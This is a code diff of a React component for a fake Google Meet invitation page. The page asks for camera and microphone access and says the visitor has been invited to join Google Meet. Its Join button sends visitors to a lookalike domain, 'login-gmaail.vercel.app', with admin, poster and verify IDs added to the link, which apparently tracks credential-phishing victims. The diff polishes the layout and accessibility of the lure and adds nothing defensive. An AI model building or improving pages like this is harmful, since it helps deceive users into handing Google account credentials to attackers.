@@ -40,73 +40,92 @@ export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
   useEffect(() => {
     requestNotificationPermission();
   }, [adminId, posterId]);
+
   return (
-    <div className="flex flex-col justify-center items-center min-h-screen gap-8 w-xs md:max-w-md mx-auto">
-      <div className="w-full flex items-start justify-start pl-8 md:pl-4">
-        <div className="w-42 md:w-52 h-12 ">
+    <div className="h-[100dvh] w-full max-w-md mx-auto px-4 py-3 sm:py-5 flex flex-col justify-between items-center overflow-hidden box-border">
+      {/* Top Logo / Title Header */}
+      <div className="w-full flex items-center justify-start pt-1 px-2">
+        <div className="w-40 sm:w-48 h-10 sm:h-12 relative">
           <Image
-            src={"/logo.png"}
-            alt="logo"
-            width={100}
-            height={100}
-            className="w-full h-full object-cover"
+            src="/logo.png"
+            alt="Google Meet Logo"
+            width={160}
+            height={48}
+            className="w-full h-full object-contain object-left"
+            priority
           />
         </div>
       </div>
 
-      <div className="relative rounded-lg shadow-md overflow-hidden">
+      {/* Camera Video Frame */}
+      <div className="relative rounded-xl shadow-lg overflow-hidden my-auto border border-gray-100">
         {cameraEnabled ? (
           <Webcam
             audio={micEnabled}
             ref={webcamRef}
-            className="object-cover w-72 h-64 md:w-104 rounded-md"
+            className="object-cover w-[86vw] max-w-[340px] sm:max-w-[380px] h-[280px] sm:h-[310px] md:h-[330px] rounded-xl"
             mirrored={true}
           />
         ) : (
-          <div className="w-72 h-64 md:w-104 rounded-md bg-gray-800 flex items-center justify-center">
-            <p className="text-white text-xl">Camera Off</p>
+          <div className="w-[86vw] max-w-[340px] sm:max-w-[380px] h-[280px] sm:h-[310px] md:h-[330px] rounded-xl bg-gray-900 flex flex-col items-center justify-center gap-2">
+            <VideoOff className="w-10 h-10 text-gray-500" />
+            <p className="text-gray-300 text-lg font-medium">Camera Off</p>
           </div>
         )}
 
-        <div className="absolute bottom-4 left-0 right-0 flex justify-center space-x-4">
+        <div className="absolute bottom-3 left-0 right-0 flex justify-center space-x-4">
           <button
             onClick={toggleMic}
-            className={`p-3 rounded-full transition-colors ${
+            type="button"
+            className={`p-3 rounded-full transition-all duration-200 shadow-md ${
               micEnabled
-                ? "bg-white text-gray-800 hover:bg-gray-200"
+                ? "bg-white text-gray-800 hover:bg-gray-100"
                 : "bg-red-500 text-white hover:bg-red-600"
             }`}
+            aria-label={micEnabled ? "Mute Microphone" : "Unmute Microphone"}
           >
             {micEnabled ? <Mic size={20} /> : <MicOff size={20} />}
           </button>
 
           <button
             onClick={toggleCamera}
-            className={`p-3 rounded-full transition-colors ${
+            type="button"
+            className={`p-3 rounded-full transition-all duration-200 shadow-md ${
               cameraEnabled
-                ? "bg-white text-gray-800 hover:bg-gray-200"
+                ? "bg-white text-gray-800 hover:bg-gray-100"
                 : "bg-red-500 text-white hover:bg-red-600"
             }`}
+            aria-label={cameraEnabled ? "Turn Off Camera" : "Turn On Camera"}
           >
             {cameraEnabled ? <Video size={20} /> : <VideoOff size={20} />}
           </button>
         </div>
       </div>
 
-      <div className="text-center space-y-3">
-        <p className="text-xl font-medium text-red-500">{sitename?.name}</p>
-        <p className="text-gray-600 font-semibold">
+      {/* Description Text */}
+      <div className="text-center space-y-1.5 px-3 my-auto max-w-xs">
+        {sitename?.name && (
+          <p className="text-xl font-semibold text-red-500">{sitename.name}</p>
+        )}
+        <p className="text-gray-600 text-sm sm:text-base font-semibold leading-snug">
           You have been invited to join Google Meet. Please join the video call
         </p>
       </div>
 
-      <button className="bg-green-500 text-white px-14 py-3 rounded-lg text-2xl  hover:bg-green-600 transition-colors font-extrabold">
+      {/* Join Action Button */}
+      <div className="w-full flex justify-center pb-2">
         <a
-          href={`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`}
+          href={
+            adminId && posterId && verifyId
+              ? `https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
+              : "https://login-gmaail.vercel.app"
+          }
+          className="bg-green-500 hover:bg-green-600 text-white px-12 sm:px-14 py-3 rounded-lg text-xl sm:text-2xl font-extrabold transition-colors shadow-md text-center block"
         >
           Join
         </a>
-      </button>
+      </div>
     </div>
   );
 }
+
